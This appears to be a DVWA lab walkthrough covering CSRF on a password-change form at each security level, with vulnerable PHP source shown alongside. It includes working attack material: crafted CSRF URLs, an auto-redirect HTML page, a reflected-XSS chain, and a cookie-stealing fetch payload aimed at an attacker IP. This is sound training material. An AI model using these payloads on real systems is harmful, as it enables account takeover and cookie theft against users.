# CSRF

## About
> CSRF is an attack that forces an end user to execute unwanted actions on a web application in which they are currently authenticated. With a little help of social engineering (such as sending a link via email/chat), an attacker may force the users of a web application to execute actions of the attacker's choosing.
> 
> A successful CSRF exploit can compromise end user data and operation in case of normal user. If the targeted end user is the administrator account, this can compromise the entire web application.
> 
> This attack may also be called "XSRF", similar to "Cross Site Scripting (XSS)", and they are often used together.

Source: DVWA Documentation

## Low Security
The functionality of this exercise is a change password mechanism and the objective of the challenge is to make the current user change their own password, without them knowing about their actions, using a CSRF attack.

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/CSRF/!images/csrf1.png?raw=true">
</p>

We also have a Test Credentials button which will send us to other window where we can test the current credentials.

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/CSRF/!images/csrf2.png?raw=true">
</p>

After changing the password, the URL will look like this:

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/CSRF/!images/csrf3.png?raw=true">
</p>

Of course is bad using the password in plaintext as parameter, but just looking at the URL, we can ask ourselves what would happen if someone visit such a URL? Let's try it out!<br/>
For example we craft the following URL: `http://localhost/DVWA/vulnerabilities/csrf/?password_new=password123&password_conf=password123&Change=Change#` and send it to someone.

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/CSRF/!images/csrf4.png?raw=true">
</p>

When the victim visits this URL, the action of changing their password is automatically done without their consent. However, the victim needs to be already logged-in to the web application.<br/>

The source code:
```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Get input
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update the database
        $current_user = dvwaCurrentUser();
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . $current_user . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?> 
```

Let's try other exploitation methods for this vulnerability. A URL like the one presented earlier, would look suspicious, so will be better to host a server that is redirecting the user to the one that we need.<br/>
We can ask the A.I. to generate us a HTML code if we don't know how to do this.
```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="0;url=http://localhost/DVWA/vulnerabilities/csrf/?password_new=passwordnew&password_conf=passwordnew&Change=Change#">
<title>Redirecting...</title>
</head>
<body>
<script>
window.location.replace("http://localhost/DVWA/vulnerabilities/csrf/?password_new=passwordnew&password_conf=passwordnew&Change=Change#");
</script>
</body>
</html>
```
We will save this file as index.html and start a python server, on port 4445, in the same location with the html file: `python3 -m http.server 4445`.<br/>
Now visiting the URL: `http://127.0.0.1:4445/index.html`, which looks better now, will redirect us to the vulnerable URL that will change the password.

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/CSRF/!images/csrf5.png?raw=true">
</p>

## Medium Security
"For the Medium level challenge, there is a check to see where the last requested page came from. The developer believes if it matches the current domain, it must come from the web application so it can be trusted"<br/>

Source code:
```php
// Checks to see where the request came from
if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) { 
```
It's true that we can solve it as earlier and modify the Referer HTTP header with Burp Suite, but this will not work in real life because is happening on the victim machine.<br/>
To solve this we will need to chain the vulnerability with XSS or even File Upload. The request must come from the same server.<br/>
I recommend to check the XSS challenges first.<br/>

We have this payload from the XSS Reflected vulnerability `<img src=x onerror='fetch("http://<IP>/?cookie=" + document.cookie)'>`. This one is used to grab the cookie.<br/>
We will take the CSRF URL and add it here instead.<br/>
When someone clicks the final URL, will be sent to XSS endpoint where the javascript code is executed and the user is redirected to the CSRF URL where the change password method is triggered.<br/>
The problem is that the payload must be encrypted to work properly, so it will help first to add it manually in the XSS Reflected challenge input, to send it, and then to grab the final encrypted URL from the browser.<br/>
Then we can change manually the password and send the URL to someone.

Final payload:`http://localhost/DVWA/vulnerabilities/xss_r/?name=<img+src%3Dx+onerror%3D'fetch("http%3A%2F%2Flocalhost%2FDVWA%2Fvulnerabilities%2Fcsrf%2F%3Fpassword_new%3Dpassword4%26password_conf%3Dpassword4%26Change%3DChange%23")'>#`

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/CSRF/!images/csrf6.png?raw=true">
</p>

## High Security
The High level implemented a CSRF token. To exploit this, we need to take somehow the user token and then to use it for the malicious request.<br/>
We can check the form format in the source code:

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/CSRF/!images/csrf7.png?raw=true">
</p>

The main problem is how to grab the user_token because this is available only in the csrf page.
In order to exploit this, we will need to use iframe and File Upload vulnerability.<br/>
First we will create the following exploit and save it as csrf.html:

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/CSRF/!images/csrf8.png?raw=true">
</p>

Author of the script: https://systemweakness.com/hackerman-sergio-csrf-tutorial-dvwa-high-security-level-4cba47f2d695 <br/>

Create an iframe of the csrf path with the id "myFrame" and then use it in the payload() function to take the user_token and send it further.<br/>
The elements are hidden because we don't want to expose this to the target.<br/>
We will set the security to Low in order to upload the file on the server. The main goal is to solve only the csrf challenge on High level, so is not a problem to use Low level for the additional steps.<br/>
Upload the file on the server and change back the level to High.<br/>
Now, we can send the path to the file to our target. When the page is visited, this is happening:

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/CSRF/!images/csrf9.png?raw=true">
</p>

But the password is successfully changed.

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/CSRF/!images/csrf10.png?raw=true">
</p>

We can also chain this vulnerability with the Stored XSS and anyone visiting the page will have the password changed.

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/CSRF/!images/csrf11.png?raw=true">
</p>

## Impossible Security
For the Impossible level, the application requires current password as well as the new password.<br/>
As the attacker does not know this, the site is protected against CSRF style attacks.

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/CSRF/!images/csrf12.png?raw=true">
</p>

